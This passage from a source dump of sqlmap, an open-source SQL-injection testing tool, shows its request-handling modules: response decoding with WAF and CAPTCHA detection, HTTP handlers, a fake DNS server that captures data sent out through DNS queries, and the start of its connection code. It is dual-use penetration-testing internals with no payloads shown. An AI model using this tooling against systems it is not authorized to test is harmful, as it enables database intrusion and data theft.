&#8217;&#8230;&#8482;\n            if \"&#\" in page:\n                def _(match):\n                    retVal = match.group(0)\n                    try:\n                        retVal = _unichr(int(match.group(1)))\n                    except (ValueError, OverflowError):\n                        pass\n                    return retVal\n                page = re.sub(r\"&#(\\d+);\", _, page)\n\n            # e.g. &zeta;\n            page = re.sub(r\"&([^;]+);\", lambda _: _unichr(HTML_ENTITIES[_.group(1)]) if HTML_ENTITIES.get(_.group(1), 0) > 255 else _.group(0), page)\n        else:\n            page = getUnicode(page, kb.pageEncoding)\n\n    return page\n\ndef processResponse(page, responseHeaders, code=None, status=None):\n    kb.processResponseCounter += 1\n\n    page = page or \"\"\n\n    parseResponse(page, responseHeaders if kb.processResponseCounter < PARSE_HEADERS_LIMIT else None, status)\n\n    if not kb.tableFrom and Backend.getIdentifiedDbms() in (DBMS.ACCESS,):\n        kb.tableFrom = extractRegexResult(SELECT_FROM_TABLE_REGEX, page)\n    else:\n        kb.tableFrom = None\n\n    if conf.parseErrors:\n        msg = extractErrorMessage(page)\n\n        if msg:\n            logger.warning(\"parsed DBMS error message: '%s'\" % msg.rstrip('.'))\n\n    if not conf.skipWaf and kb.processResponseCounter < IDENTYWAF_PARSE_LIMIT:\n        rawResponse = \"%s %s %s\\n%s\\n%s\" % (_http_client.HTTPConnection._http_vsn_str, code or \"\", status or \"\", \"\".join(getUnicode(responseHeaders.headers if responseHeaders else [])), page[:HEURISTIC_PAGE_SIZE_THRESHOLD])\n\n        with kb.locks.identYwaf:\n            identYwaf.non_blind.clear()\n            if identYwaf.non_blind_check(rawResponse, silent=True):\n                for waf in set(identYwaf.non_blind):\n                    if waf not in kb.identifiedWafs:\n                        kb.identifiedWafs.add(waf)\n                        errMsg = \"WAF/IPS identified as '%s'\" % identYwaf.format_name(waf)\n                        singleTimeLogMessage(errMsg, logging.CRITICAL)\n\n    if kb.originalPage is None:\n        for regex in (EVENTVALIDATION_REGEX, VIEWSTATE_REGEX):\n            match = re.search(regex, page)\n            if match and PLACE.POST in conf.parameters:\n                name, value = match.groups()\n                if PLACE.POST in conf.paramDict and name in conf.paramDict[PLACE.POST]:\n                    if conf.paramDict[PLACE.POST][name] in page:\n                        continue\n                    else:\n                        msg = \"do you want to automatically adjust the value of '%s'? [y/N]\" % name\n\n                        if not readInput(msg, default='N', boolean=True):\n                            continue\n\n                        conf.paramDict[PLACE.POST][name] = value\n                conf.parameters[PLACE.POST] = re.sub(r\"(?i)(%s=)[^&]+\" % re.escape(name), r\"\\g<1>%s\" % value.replace('\\\\', r'\\\\'), conf.parameters[PLACE.POST])\n\n    if not kb.browserVerification and re.search(r\"(?i)browser.?verification\", page or \"\"):\n        kb.browserVerification = True\n        warnMsg = \"potential browser verification protection mechanism detected\"\n        if re.search(r\"(?i)CloudFlare\", page):\n            warnMsg += \" (CloudFlare)\"\n        singleTimeWarnMessage(warnMsg)\n\n    if not kb.captchaDetected and re.search(r\"(?i)captcha\", page or \"\"):\n        for match in re.finditer(r\"(?si)<form.+?</form>\", page):\n            if re.search(r\"(?i)captcha\", match.group(0)):\n                kb.captchaDetected = True\n                break\n\n        if re.search(r\"<meta[^>]+\\brefresh\\b[^>]+\\bcaptcha\\b\", page):\n            kb.captchaDetected = True\n\n        if kb.captchaDetected:\n            warnMsg = \"potential CAPTCHA protection mechanism detected\"\n            if re.search(r\"(?i)<title>[^<]*CloudFlare\", page):\n                warnMsg += \" (CloudFlare)\"\n            singleTimeWarnMessage(warnMsg)\n\n    if re.search(BLOCKED_IP_REGEX, page):\n        warnMsg = \"it appears that you have been blocked by the target server\"\n        singleTimeWarnMessage(warnMsg)\n", "lib/request/chunkedhandler.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import conf\nfrom lib.core.enums import HTTP_HEADER\nfrom thirdparty.six.moves import urllib as _urllib\n\nclass ChunkedHandler(_urllib.request.HTTPHandler):\n    \"\"\"\n    Ensures that HTTPHandler is working properly in case of Chunked Transfer-Encoding\n    \"\"\"\n\n    def _http_request(self, request):\n        host = request.get_host() if hasattr(request, \"get_host\") else request.host\n        if not host:\n            raise _urllib.error.URLError(\"no host given\")\n\n        if request.data is not None:  # POST\n            data = request.data\n            if not request.has_header(HTTP_HEADER.CONTENT_TYPE):\n                request.add_unredirected_header(HTTP_HEADER.CONTENT_TYPE, \"application/x-www-form-urlencoded\")\n            if not request.has_header(HTTP_HEADER.CONTENT_LENGTH) and not conf.chunked:\n                request.add_unredirected_header(HTTP_HEADER.CONTENT_LENGTH, \"%d\" % len(data))\n\n        sel_host = host\n        if request.has_proxy():\n            sel_host = _urllib.parse.urlsplit(request.get_selector()).netloc\n\n        if not request.has_header(HTTP_HEADER.HOST):\n            request.add_unredirected_header(HTTP_HEADER.HOST, sel_host)\n        for name, value in self.parent.addheaders:\n            name = name.capitalize()\n            if not request.has_header(name):\n                request.add_unredirected_header(name, value)\n        return request\n\n    http_request = _http_request\n", "lib/request/rangehandler.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapConnectionException\nfrom thirdparty.six.moves import urllib as _urllib\n\nclass HTTPRangeHandler(_urllib.request.BaseHandler):\n    \"\"\"\n    Handler that enables HTTP Range headers.\n\n    Reference: http://stackoverflow.com/questions/1971240/python-seek-on-remote-file\n    \"\"\"\n\n    def http_error_206(self, req, fp, code, msg, hdrs):\n        # 206 Partial Content Response\n        r = _urllib.response.addinfourl(fp, hdrs, req.get_full_url())\n        r.code = code\n        r.msg = msg\n        return r\n\n    def http_error_416(self, req, fp, code, msg, hdrs):\n        # HTTP's Range Not Satisfiable error\n        errMsg = \"there was a problem while connecting \"\n        errMsg += \"target ('406 - Range Not Satisfiable')\"\n        raise SqlmapConnectionException(errMsg)\n", "lib/request/pkihandler.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import conf\nfrom lib.core.common import getSafeExString\nfrom lib.core.exception import SqlmapConnectionException\nfrom thirdparty.six.moves import http_client as _http_client\nfrom thirdparty.six.moves import urllib as _urllib\n\nclass HTTPSPKIAuthHandler(_urllib.request.HTTPSHandler):\n    def __init__(self, auth_file):\n        _urllib.request.HTTPSHandler.__init__(self)\n        self.auth_file = auth_file\n\n    def https_open(self, req):\n        return self.do_open(self.getConnection, req)\n\n    def getConnection(self, host, timeout=None):\n        try:\n            # Reference: https://docs.python.org/2/library/ssl.html#ssl.SSLContext.load_cert_chain\n            return _http_client.HTTPSConnection(host, cert_file=self.auth_file, key_file=self.auth_file, timeout=conf.timeout)\n        except IOError as ex:\n            errMsg = \"error occurred while using key \"\n            errMsg += \"file '%s' ('%s')\" % (self.auth_file, getSafeExString(ex))\n            raise SqlmapConnectionException(errMsg)\n", "lib/request/dns.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport binascii\nimport os\nimport re\nimport socket\nimport struct\nimport threading\nimport time\n\nclass DNSQuery(object):\n    \"\"\"\n    >>> DNSQuery(b'|K\\\\x01 \\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x03www\\\\x06google\\\\x03com\\\\x00\\\\x00\\\\x01\\\\x00\\\\x01\\\\x00\\\\x00)\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x0c\\\\x00\\\\n\\\\x00\\\\x08O4|Np!\\\\x1d\\\\xb3')._query == b\"www.google.com.\"\n    True\n    >>> DNSQuery(b'\\\\x00')._query == b\"\"\n    True\n    \"\"\"\n\n    def __init__(self, raw):\n        self._raw = raw\n        self._query = b\"\"\n\n        try:\n            type_ = (ord(raw[2:3]) >> 3) & 15                   # Opcode bits\n\n            if type_ == 0:                                      # Standard query\n                i = 12\n                j = ord(raw[i:i + 1])\n\n                while j != 0:\n                    self._query += raw[i + 1:i + j + 1] + b'.'\n                    i = i + j + 1\n                    j = ord(raw[i:i + 1])\n        except TypeError:\n            pass\n\n    def response(self, resolution):\n        \"\"\"\n        Crafts raw DNS resolution response packet\n        \"\"\"\n\n        retVal = b\"\"\n\n        if self._query:\n            retVal += self._raw[:2]                                                         # Transaction ID\n            retVal += b\"\\x85\\x80\"                                                           # Flags (Standard query response, No error)\n            retVal += self._raw[4:6] + self._raw[4:6] + b\"\\x00\\x00\\x00\\x00\"                 # Questions and Answers Counts\n            retVal += self._raw[12:(12 + self._raw[12:].find(b\"\\x00\") + 5)]                 # Original Domain Name Query\n            retVal += b\"\\xc0\\x0c\"                                                           # Pointer to domain name\n            retVal += b\"\\x00\\x01\"                                                           # Type A\n            retVal += b\"\\x00\\x01\"                                                           # Class IN\n            retVal += b\"\\x00\\x00\\x00\\x20\"                                                   # TTL (32 seconds)\n            retVal += b\"\\x00\\x04\"                                                           # Data length\n            retVal += b\"\".join(struct.pack('B', int(_)) for _ in resolution.split('.'))     # 4 bytes of IP\n\n        return retVal\n\nclass DNSServer(object):\n    \"\"\"\n    Used for making fake DNS resolution responses based on received\n    raw request\n\n    Reference(s):\n        https://code.activestate.com/recipes/491264-mini-fake-dns-server/\n        https://web.archive.org/web/20150418152405/https://code.google.com/p/marlon-tools/source/browse/tools/dnsproxy/dnsproxy.py\n    \"\"\"\n\n    def __init__(self):\n        self._check_localhost()\n        self._requests = []\n        self._lock = threading.Lock()\n\n        try:\n            self._socket = socket._orig_socket(socket.AF_INET, socket.SOCK_DGRAM)\n        except AttributeError:\n            self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n        self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self._socket.bind((\"\", 53))\n        self._running = False\n        self._initialized = False\n\n    def _check_localhost(self):\n        response = b\"\"\n\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            s.connect((\"\", 53))\n            s.send(binascii.unhexlify(\"6509012000010000000000010377777706676f6f676c6503636f6d00000100010000291000000000000000\"))  # A www.google.com\n            response = s.recv(512)\n        except:\n            pass\n        finally:\n            if response and b\"google\" in response:\n                raise socket.error(\"another DNS service already running on '0.0.0.0:53'\")\n\n    def pop(self, prefix=None, suffix=None):\n        \"\"\"\n        Returns received DNS resolution request (if any) that has given\n        prefix/suffix combination (e.g. prefix.<query result>.suffix.domain)\n        \"\"\"\n\n        retVal = None\n\n        if prefix and hasattr(prefix, \"encode\"):\n            prefix = prefix.encode()\n\n        if suffix and hasattr(suffix, \"encode\"):\n            suffix = suffix.encode()\n\n        with self._lock:\n            for _ in self._requests:\n                if prefix is None and suffix is None or re.search(b\"%s\\\\..+\\\\.%s\" % (prefix, suffix), _, re.I):\n                    self._requests.remove(_)\n                    retVal = _.decode()\n                    break\n\n        return retVal\n\n    def run(self):\n        \"\"\"\n        Runs a DNSServer instance as a daemon thread (killed by program exit)\n        \"\"\"\n\n        def _():\n            try:\n                self._running = True\n                self._initialized = True\n\n                while True:\n                    data, addr = self._socket.recvfrom(1024)\n                    _ = DNSQuery(data)\n                    self._socket.sendto(_.response(\"127.0.0.1\"), addr)\n\n                    with self._lock:\n                        self._requests.append(_._query)\n\n            except KeyboardInterrupt:\n                raise\n\n            finally:\n                self._running = False\n\n        thread = threading.Thread(target=_)\n        thread.daemon = True\n        thread.start()\n\nif __name__ == \"__main__\":\n    server = None\n    try:\n        server = DNSServer()\n        server.run()\n\n        while not server._initialized:\n            time.sleep(0.1)\n\n        while server._running:\n            while True:\n                _ = server.pop()\n\n                if _ is None:\n                    break\n                else:\n                    print(\"[i] %s\" % _)\n\n            time.sleep(1)\n\n    except socket.error as ex:\n        if 'Permission' in str(ex):\n            print(\"[x] Please run with sudo/Administrator privileges\")\n        else:\n            raise\n    except KeyboardInterrupt:\n        os._exit(0)\n    finally:\n        if server:\n            server._running = False\n", "lib/request/methodrequest.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getText\nfrom thirdparty.six.moves import urllib as _urllib\n\nclass MethodRequest(_urllib.request.Request):\n    \"\"\"\n    Used to create HEAD/PUT/DELETE/... requests with urllib\n    \"\"\"\n\n    def set_method(self, method):\n        self.method = getText(method.upper())  # Dirty hack for Python3 (may it rot in hell!)\n\n    def get_method(self):\n        return getattr(self, 'method', _urllib.request.Request.get_method(self))\n", "lib/request/connect.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport binascii\nimport inspect\nimport logging\nimport os\nimport random\nimport re\nimport socket\nimport string\nimport struct\nimport sys\nimport time\nimport traceback\n\ntry:\n    import websocket\n    from websocket import WebSocketException\nexcept ImportError:\n    class WebSocketException(Exception):\n        pass\n\nfrom lib.core.agent import agent\nfrom lib.core.common import asciifyUrl\nfrom lib.core.common import calculateDeltaSeconds\nfrom lib.core.common import checkFile\nfrom lib.core.common import checkSameHost\nfrom lib.core.common import chunkSplitPostData\nfrom lib.core.common import clearConsoleLine\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import escapeJsonValue\nfrom lib.core.common import evaluateCode\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import filterNone\nfrom lib.core.common import findMultipartPostBoundary\nfrom lib.core.common import getCurrentThreadData\nfrom lib.core.common import getHeader\nfrom lib.core.common import getHostHeader\nfrom lib.core.common import getRequestHeader\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import logHTTPTraffic\nfrom lib.core.common import openFile\nfrom lib.core.common import popValue\nfrom lib.core.common import parseJson\nfrom lib.core.common import pushValue\nfrom lib.core.common import randomizeParameterValue\nfrom lib.core.common import randomInt\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.common import removeReflectiveValues\nfrom lib.core.common import safeVariableNaming\nfrom lib.core.common import singleTimeLogMessage\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import stdev\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import unsafeVariableNaming\nfrom lib.core.common import urldecode\nfrom lib.core.common import urlencode\nfrom lib.core.common import wasLastResponseDelayed\nfrom lib.core.compat import patchHeaders\nfrom lib.core.compat import xrange\nfrom lib.core.convert import encodeBase64\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getText\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import cmdLineOptions\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.datatype import AttribDict\nfrom lib.core.decorators import stackedmethod\nfrom lib.core.dicts import POST_HINT_CONTENT_TYPES\nfrom lib.core.enums import ADJUST_TIME_DELAY\nfrom lib.core.enums import AUTH_TYPE\nfrom lib.core.enums import CUSTOM_LOGGING\nfrom lib.core.enums import HINT\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import HTTPMETHOD\nfrom lib.core.enums import NULLCONNECTION\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.enums import PLACE\nfrom lib.core.enums import POST_HINT\nfrom lib.core.enums import REDIRECTION\nfrom lib.core.enums import WEB_PLATFORM\nfrom lib.core.exception import SqlmapCompressionException\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapGenericException\nfrom lib.core.exception import SqlmapSkipTargetException\nfrom lib.core.exception import SqlmapSyntaxException\nfrom lib.core.exception import SqlmapTokenException\nfrom lib.core.exception import SqlmapValueException\nfrom lib.core.settings import ASTERISK_MARKER\nfrom lib.core.settings import BOUNDARY_BACKSLASH_MARKER\nfrom lib.core.settings import DEFAULT_CONTENT_TYPE\nfrom lib.core.settings import DEFAULT_COOKIE_DELIMITER\nfrom lib.core.settings import DEFAULT_GET_POST_DELIMITER\nfrom lib.core.settings import DEFAULT_USER_AGENT\nfrom lib.core.settings import EVALCODE_ENCODED_PREFIX\nfrom lib.core.settings import HTTP_ACCEPT_ENCODING_HEADER_VALUE\nfrom lib.core.settings import HTTP_ACCEPT_HEADER_VALUE\nfrom lib.core.settings import IPS_WAF_CHECK_PAYLOAD\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import JAVASCRIPT_HREF_REGEX\nfrom lib.core.settings import LARGE_READ_TRIM_MARKER\nfrom lib.core.settings import LIVE_COOKIES_TIMEOUT\nfrom lib.core.settings import MAX_CONNECTION_READ_SIZE\nfrom lib.core.settings import MAX_CONNECTIONS_REGEX\nfrom lib.core.settings import MAX_CONNECTION_TOTAL_SIZE\nfrom lib.core.settings import MAX_CONSECUTIVE_CONNECTION_ERRORS\nfrom lib.core.settings import MAX_MURPHY_SLEEP_TIME\nfrom lib.core.settings import META_REFRESH_REGEX\nfrom lib.core.settings import MAX_TIME_RESPONSES\nfrom lib.core.settings import MIN_TIME_RESPONSES\nfrom lib.core.settings import PAYLOAD_DELIMITER\nfrom lib.core.settings import PERMISSION_DENIED_REGEX\nfrom lib.core.settings import PLAIN_TEXT_CONTENT_TYPE\nfrom lib.core.settings import RANDOM_INTEGER_MARKER\nfrom lib.core.settings import RANDOM_STRING_MARKER\nfrom lib.core.settings import REPLACEMENT_MARKER\nfrom lib.core.settings import SAFE_HEX_MARKER\nfrom lib.core.settings import TEXT_CONTENT_TYPE_REGEX\nfrom lib.core.settings import UNENCODED_ORIGINAL_VALUE\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.settings import URI_HTTP_HEADER\nfrom lib.core.settings import WARN_TIME_STDEV\nfrom lib.core.settings import WEBSOCKET_INITIAL_TIMEOUT\nfrom lib.core.settings import YUGE_FACTOR\nfrom lib.request.basic import decodePage\nfrom lib.request.basic import forgeHeaders\nfrom lib.request.basic import processResponse\nfrom lib.request.comparison import comparison\nfrom lib.request.direct import direct\nfrom lib.request.methodrequest import MethodRequest\nfrom lib.utils.safe2bin import safecharencode\nfrom thirdparty import six\nfrom thirdparty.odict import OrderedDict\nfrom thirdparty.six import unichr as _unichr\nfrom thirdparty.six.moves import http_client as _http_client\nfrom thirdparty.six.moves import urllib as _urllib\nfrom thirdparty.socks.socks import ProxyError\n\nclass Connect(object):\n    \"\"\"\n    This class defines methods used to perform HTTP requests\n    \"\"\"\n\n    @staticmethod\n    def _getPageProxy(**kwargs):\n        try:\n            if (len(inspect.stack()) > sys.getrecursionlimit() // 2):   # Note: https://github.com/sqlmapproject/sqlmap/issues/4525\n                warnMsg = \"unable to connect to the target URL\"\n                raise SqlmapConnectionException(warnMsg)\n        except (TypeError, UnicodeError):\n            pass\n\n        try:\n            return Connect.getPage(**kwargs)\n        except RuntimeError:\n            return None, None, None\n\n    @staticmethod\n    def _retryProxy(**kwargs):\n        threadData = getCurrentThreadData()\n        threadData.retriesCount += 1\n\n        if conf.proxyList and threadData.retriesCount >= conf.retries and not kb.locks.handlers.locked():\n            warnMsg = \"changing proxy\"\n            logger.warning(warnMsg)\n\n            conf.proxy = None\n            threadData.retriesCount = 0\n\n            setHTTPHandlers()\n\n        if kb.testMode and kb.previousMethod == PAYLOAD.METHOD.TIME:\n            # timed based payloads can cause web server unresponsiveness\n            # if the injectable piece of code is some kind of JOIN-like query\n            warnMsg = \"most likely web server instance hasn't recovered yet \"\n            warnMsg += \"from previous timed based payload. If the problem \"\n            warnMsg += \"persists please wait for a few minutes and rerun \"\n            warnMsg += \"without flag 'T' in option '--technique' \"\n            warnMsg += \"(e.g. '--flush-session --technique=BEUS') or try to \"\n            warnMsg += \"lower the value of option '--time-sec' (e.g. '--time-sec=2')\"\n            singleTimeWarnMessage(warnMsg)\n\n        elif kb.originalPage is None:\n            if conf.tor:\n                warnMsg = \"please make sure that you have \"\n                warnMsg += \"Tor installed and running so \"\n                warnMsg += \"you could successfully use \"\n                warnMsg += \"switch '--tor' \"\n                if IS_WIN:\n                    warnMsg += \"(e.g. 'https://www.torproject.org/download/')\"\n                else:\n                    warnMsg += \"(e.g. 'https://help.ubuntu.com/community/Tor')\"\n            else:\n                warnMsg = \"if the problem persists please check that the provided \"\n                warnMsg += \"target URL is reachable\"\n\n                items = []\n                if not conf.randomAgent:\n                    items.append(\"switch '--random-agent'\")\n                if not any((conf.proxy, conf.proxyFile, conf.tor)):\n                    items.append(\"proxy switches ('--proxy', '--proxy-file'...)\")\n                if items:\n                    warnMsg += \". In case that it is, \"\n                    warnMsg += \"you can try to rerun with \"\n                    warnMsg += \" and/or \".join(items)\n\n            singleTimeWarnMessage(warnMsg)\n\n        elif conf.threads > 1:\n            warnMsg = \"if the problem persists please try to lower \"\n            warnMsg += \"the number of used threads (option '--threads')\"\n            singleTimeWarnMessage(warnMsg)\n\n        kwargs['retrying'] = True\n        return Connect._getPageProxy(**kwargs)\n\n    @staticmethod\n    def _connReadProxy(conn):\n        retVal = b\"\"\n\n        if not kb.dnsMode and conn:\n            headers = conn.info()\n            if kb.pageCompress and headers and hasattr(headers, \"getheader\") and (headers.getheader(HTTP_HEADER.CONTENT_ENCODING, \"\").lower() in (\"gzip\", \"deflate\") or \"text\" not in headers.getheader(HTTP_HEADER.CONTENT_TYPE, \"\").lower()):\n                retVal = conn.read(MAX_CONNECTION_TOTAL_SIZE)\n                if len(retVal) == MAX_CONNECTION_TOTAL_SIZE:\n                    warnMsg = \"large compressed response detected. Disabling compression\"\n                    singleTimeWarnMessage(warnMsg)\n                    kb.pageCompress = False\n                    raise SqlmapCompressionException\n            else:\n                while True:\n                    if not conn:\n                        break\n                    else:\n                        try:\n                            part = conn.read(MAX_CONNECTION_READ_SIZE)\n                        except AssertionError:\n                            part = b\"\"\n\n                    if len(part) == MAX_CONNECTION_READ_SIZE:\n                        warnMsg = \"large response detected. This could take a while\"\n                        singleTimeWarnMessage(warnMsg)\n                        part = re.sub(getBytes(r\"(?si)%s.+?%s\" % (kb.chars.stop, kb.chars.start)), getBytes(\"%s%s%s\" % (kb.chars.stop, LARGE_READ_TRIM_MARKER, kb.chars.start)), part)\n                        retVal += part\n                    else:\n                        retVal += part\n                        break\n\n                    if len(retVal) > MAX_CONNECTION_TOTAL_SIZE:\n                        warnMsg = \"too large response detected. Automatically trimming it\"\n                        singleTimeWarnMessage(warnMsg)\n                        break\n\n        if conf.yuge:\n            retVal = YUGE_FACTOR * retVal\n\n        return retVal\n\n    @staticmethod\n    def getPage(**kwargs):\n        \"\"\"\n        This method connects to the target URL or proxy and returns\n        the target URL page content\n        \"\"\"\n\n        if conf.offline:\n            return None, None, None\n\n        url = kwargs.get(\"url\", None) or conf.url\n        get = kwargs.get(\"get\", None)\n        post = kwargs.get(\"post\", None)\n        method = kwargs.get(\"method\", None)\n        cookie = kwargs.get(\"cookie\", None)\n        ua = kwargs.get(\"ua\", None) or conf.agent\n        referer = kwargs.get(\"referer\", None) or conf.referer\n        direct_ = kwargs.get(\"direct\", False)\n        multipart = kwargs.get(\"multipart\", None)\n        silent = kwargs.get(\"silent\", False)\n        raise404 = kwargs.get(\"raise404\", True)\n        timeout = kwargs.get(\"timeout\", None) or conf.timeout\n        auxHeaders = kwargs.get(\"auxHeaders\", None)\n        response = kwargs.get(\"response\", False)\n        ignoreTimeout = kwargs.get(\"ignoreTimeout\", False) or kb.ignoreTimeout or conf.ignoreTimeouts\n        refreshing = kwargs.get(\"refreshing\", False)\n        retrying = kwargs.get(\"retrying\", False)\n        crawling = kwargs.get(\"crawling\", False)\n        checking = kwargs.get(\"checking\", False)\n        skipRead = kwargs.get(\"skipRead\", False)\n        finalCode = kwargs.get(\"finalCode\", False)\n        chunked = kwargs.get(\"chunked\", False) or conf.chunked\n\n        start = time.time()\n\n        if isinstance(conf.delay, (int, float)) and conf.delay > 0:\n            time.sleep(conf.delay)\n\n        threadData = getCurrentThreadData()\n        with kb.locks.request:\n            kb.requestCounter += 1\n            threadData.lastRequestUID = kb.requestCounter\n\n            if conf.proxyFreq:\n                if kb.requestCounter % conf.proxyFreq == 0:\n                    conf.proxy = None\n\n                    warnMsg = \"changing proxy\"\n                    logger.warning(warnMsg)\n\n                    setHTTPHandlers()\n\n        if conf.dummy or conf.murphyRate and randomInt() % conf.murphyRate == 0:\n            if conf.murphyRate:\n                time.sleep(randomInt() % (MAX_MURPHY_SLEEP_TIME + 1))\n\n            page, headers, code = randomStr(int(randomInt()), alphabet=[_unichr(_) for _ in xrange(256)]), None, None if not conf.murphyRate else randomInt(3)\n\n            threadData.lastPage = page\n            threadData.lastCode = code\n\n            return page, headers, code\n\n        if conf.liveCookies:\n            with kb.locks.liveCookies:\n                if not checkFile(conf.liveCookies, raiseOnError=False) or os.path.getsize(conf.liveCookies) == 0:\n                    warnMsg = \"[%s] [WARNING] live cookies file '%s' is empty or non-existent. Waiting for timeout (%d seconds)\" % (time.strftime(\"%X\"), conf.liveCookies, LIVE_COOKIES_TIMEOUT)\n                    dataToStdout(warnMsg)\n\n                    valid = False\n                    for _ in xrange(LIVE_COOKIES_TIMEOUT):\n                        if checkFile(conf.liveCookies, raiseOnError=False) and os.path.getsize(conf.liveCookies) > 0:\n                            valid = True\n                            break\n                        else:\n                            dataToStdout('.')\n                            time.sleep(1)\n\n                    dataToStdout(\"\\n\")\n\n                    if not valid:\n                        errMsg = \"problem occurred while loading cookies from file '%s'\" % conf.liveCookies\n                        raise SqlmapValueException(errMsg)\n\n                cookie = openFile(conf.liveCookies).read().strip()\n                cookie = re.sub(r\"(?i)\\ACookie:\\s*\", \"\", cookie)\n\n        if multipart:\n            post = multipart\n        else:\n            if not post:\n                chunked = False\n\n            elif chunked:\n                post = _urllib.parse.unquote(post)\n                post = chunkSplitPostData(post)\n\n        webSocket = url.lower().startswith(\"ws\")\n\n        if not _urllib.parse.urlsplit(url).netloc:\n            url = _urllib.parse.urljoin(conf.url, url)\n\n        # flag to know if we are dealing with the same target host\n        target = checkSameHost(url, conf.url)\n\n        if not retrying:\n            # Reset the number of connection retries\n            threadData.retriesCount = 0\n\n        # fix for known issue when urllib2 just skips the other part of provided\n        # url splitted with space char while urlencoding it in the later phase\n        url = url.replace(\" \", \"%20\")\n\n        if \"://\" not in url:\n            url = \"http://%s\" % url\n\n        conn = None\n        page = None\n        code = None\n        status = None\n\n        _ = _urllib.parse.urlsplit(url)\n        requestMsg = u\"HTTP request [#%d]:\\r\\n%s \" % (threadData.lastRequestUID, method or (HTTPMETHOD.POST if post is not None else HTTPMETHOD.GET))\n        requestMsg += getUnicode((\"%s%s\" % (_.path or \"/\", (\"?%s\" % _.query) if _.query else \"\")) if not any((refreshing, crawling, checking)) else url)\n        responseMsg = u\"HTTP response \"\n        requestHeaders = u\"\"\n        responseHeaders = None\n        logHeaders = u\"\"\n        skipLogTraffic = False\n\n        raise404 = raise404 and not kb.ignoreNotFound\n\n        # support for non-latin (e.g. cyrillic) URLs as urllib/urllib2 doesn't\n        # support those by default\n        url = asciifyUrl(url)\n\n        try:\n            socket.setdefaulttimeout(timeout)\n\n            if direct_:\n                if '?' in url:\n                    url, params = url.split('?', 1)\n                    params = urlencode(params)\n                    url = \"%s?%s\" % (url, params)\n\n            elif any((refreshing, crawling, checking)):\n                pass\n\n            elif target:\n                if conf.forceSSL:\n                    url = re.sub(r\"(?i)\\A(http|ws):\", r\"\\g<1>s:\", url)\n                    url = re.sub(r\"(?i):80/\", \":443/\", url)\n\n                if PLACE.GET in conf.parameters and not get:\n                    get = conf.parameters[PLACE.GET]\n\n                    if not conf.skipUrlEncode:\n                        get = urlencode(get, limit=True)\n\n                if get:\n                    if '?' in url:\n                        url = \"%s%s%s\" % (url, DEFAULT_GET_POST_DELIMITER, get)\n                        requestMsg += \"%s%s\" % (DEFAULT_GET_POST_DELIMITER, get)\n                    else:\n                        url = \"%s?%s\" % (url, get)\n                        requestMsg += \"?%s\" % get\n\n                if PLACE.POST in conf.parameters and not post and method != HTTPMETHOD.GET:\n                    post = conf.parameters[PLACE.POST]\n\n            elif get:\n                url = \"%s?%s\" % (url, get)\n                requestMsg += \"?%s\" % get\n\n            requestMsg += \" %s\" % _http_client.HTTPConnection._http_vsn_str\n\n            # Prepare HTTP headers\n            headers = forgeHeaders({HTTP_HEADER.COOKIE: cookie, HTTP_HEADER.USER_AGENT: ua, HTTP_HEADER.REFERER: referer, HTTP_HEADER.HOST: getHeader(dict(conf.httpHeaders), HTTP_HEADER.HOST) or getHostHeader(url)}, base=None if target else {})\n\n            if HTTP_HEADER.COOKIE in headers:\n                cookie = headers[HTTP_HEADER.COOKIE]\n\n            if kb.authHeader:\n                headers[HTTP_HEADER.AUTHORIZATION] = kb.authHeader\n\n            if kb.proxyAuthHeader:\n                headers[HTTP_HEADER.PROXY_AUTHORIZATION] = kb.proxyAuthHeader\n\n            if not conf.requestFile or not target:\n                if not getHeader(headers, HTTP_HEADER.ACCEPT):\n                    headers[HTTP_HEADER.ACCEPT] = HTTP_ACCEPT_HEADER_VALUE\n\n                if not getHeader(headers, HTTP_HEADER.ACCEPT_ENCODING):\n                    headers[HTTP_HEADER.ACCEPT_ENCODING] = HTTP_ACCEPT_ENCODING_HEADER_VALUE if kb.pageCompress else \"identity\"\n\n            elif conf.requestFile and getHeader(headers, HTTP_HEADER.USER_AGENT) == DEFAULT_USER_AGENT:\n                for header in headers:\n                    if header.upper() == HTTP_HEADER.USER_AGENT.upper():\n                        del headers[header]\n                        break\n\n            if post is not None and not multipart and not getHeader(headers, 